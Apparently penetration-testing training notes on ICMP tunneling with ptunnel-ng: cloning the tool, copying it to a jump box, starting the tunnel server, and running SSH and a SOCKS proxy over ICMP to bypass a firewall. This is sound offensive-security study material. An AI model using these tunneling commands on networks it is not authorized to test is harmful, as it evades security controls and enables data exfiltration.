**Overview:**
- ICMP tunneling encapsulates traffic within `ICMP packets` containing `echo requests` and `responses`. ICMP tunneling would only work when ping responses are permitted within a firewalled network. 
- When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.
----
```
git clone https://github.com/utoni/ptunnel-ng.git
```

Once the ptunnel-ng repo is cloned to our attack host, we can run the `autogen.sh` script located at the root of the ptunnel-ng directory.

```
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
 transfer the file, the -r flag will transfer the repo and all the files contained in the repo.

```
sudo ./ptunnel-ng -r10.129.202.64 -R22
```
strat a ptunnel server on the target host. The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on

```
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```
Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`)

```
ssh -p2222 -lubuntu 127.0.0.1
```
If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.

```
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
enable port forwarding through the enstablished tunnel
